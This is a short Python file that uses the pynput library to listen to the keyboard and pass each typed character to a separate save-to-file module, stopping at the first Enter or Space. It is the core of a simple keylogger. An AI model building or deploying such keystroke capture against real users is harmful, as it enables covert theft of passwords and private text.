from pynput import keyboard
import Save_to_file


def key_press(key):
    if hasattr(key, 'char'):
        Save_to_file.save_to_file(key.char)


def key_release(key):
    if key == keyboard.Key.enter or key == keyboard.Key.space:
        return False


def hook_keyboard():
    with keyboard.Listener(on_press=key_press, on_release=key_release) as listener:
        listener.join()

